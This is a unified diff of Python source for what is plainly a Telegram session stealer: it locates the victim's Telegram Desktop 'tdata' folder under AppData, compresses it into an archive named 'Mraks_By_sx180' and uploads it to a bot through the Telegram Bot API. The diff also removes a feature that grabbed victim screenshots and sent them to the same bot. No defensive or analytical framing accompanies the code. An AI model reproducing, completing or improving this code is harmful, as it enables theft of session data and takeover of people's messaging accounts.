@@ -1,11 +1,8 @@
-def send_message_to_group(chat_id, screenshot):
+def send_message_to_group(chat_id):
     url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
     data = {'chat_id': chat_id, 'caption': f"System Name: {system_name}\n"}
-    image_buffer = BytesIO()
-    screenshot.save(image_buffer, format='JPEG')
-    image_buffer.seek(0)
-    files = {'photo': ('screenshot.jpg', image_buffer)}
-    response = requests.post(url, data=data, files=files)
+    response = requests.post(url, data=data)
+
 def create_zip_archive(source_dir, output_zip):
     try:
         with zipfile.ZipFile(output_zip + '.zip', 'w', compression=zipfile.ZIP_LZMA, compresslevel=9) as zipf:
@@ -19,29 +16,24 @@ def create_zip_archive(source_dir, output_zip):
                     try:
                         zipf.write(file_path, os.path.relpath(file_path, source_dir))
                     except Exception as e:
-                        screenshot = ImageGrab.grab()
-                        for chat_id in chat_ids:
-                            send_message_to_group(chat_id, screenshot)
+                        send_message_to_group(chat_id)
                         time.sleep(10)
                         pass
         return output_zip + '.zip'
     except Exception as e:
-        screenshot = ImageGrab.grab()
-        for chat_id in chat_ids:
-            send_message_to_group(chat_id, screenshot)
+        send_message_to_group(chat_id)
         time.sleep(10)
         print(f"Error creating zip archive: {str(e)}")
         return None
+
 def send_file_to_telegram(file_path, file_name):
     url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
-    for chat_id in chat_ids:
-        files = {'document': (file_name, open(file_path, 'rb'))}
-        data = {'chat_id': chat_id}
-        response = requests.post(url, files=files, data=data)
-        if response.status_code != 200:
-            print(f"Error sending file to Telegram. Chat ID: {chat_id}. Status code: {response.status_code}")
-            print(response.text)
-            main()
+    files = {'document': (file_name, open(file_path, 'rb'))}
+    data = {'chat_id': chat_id}
+    response = requests.post(url, files=files, data=data)
+    if response.status_code != 200:
+        print(f"Error sending file to Telegram. Chat ID: {chat_id}. Status code: {response.status_code}")
+        print(response.text)
 def archive_and_send():
     if os.path.exists(user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"):
         try:
@@ -50,6 +42,7 @@ def archive_and_send():
             if not os.path.exists(temp_dir):
                 os.makedirs(temp_dir)  # Создаем папку, если её нет
             output_zip = os.path.join(temp_dir, 'Mraks_By_sx180')
+
             created_zip = create_zip_archive(source_dir, output_zip)
             if created_zip:
                 send_file_to_telegram(created_zip, 'Mraks_By_sx180.zip')
